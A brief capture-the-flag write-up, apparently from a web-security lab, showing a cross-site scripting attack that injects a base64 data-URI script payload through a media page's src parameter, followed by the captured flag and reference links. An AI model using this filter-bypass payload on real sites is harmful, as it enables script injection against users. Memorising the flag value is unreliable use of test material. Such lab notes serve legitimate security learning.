# Cross Site Scripting XSS image

##notes

```bash
http://192.168.1.34/?page=media&src=nsa
```

<object data="http://192.168.1.34/images/nsa_prism.jpg"></object>

data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=

<script>alert("Hello");</script>

```bash
http://192.168.1.34/?page=media&src=nsa;data:text/html;base64,PHNjcmlwdD5hbGVydCgiIik7PC9zY3JpcHQ+
```

THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D

## Info

[base64decode](https://www.base64decode.net/)<br/>
[owasp](https://owasp.org/www-community/attacks/xss/)<br/>
[medium](https://medium.com/@amar.infosec4fun/xss-challenges-4c21b3ae9673])<br/>
[paladion](https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris)<br/>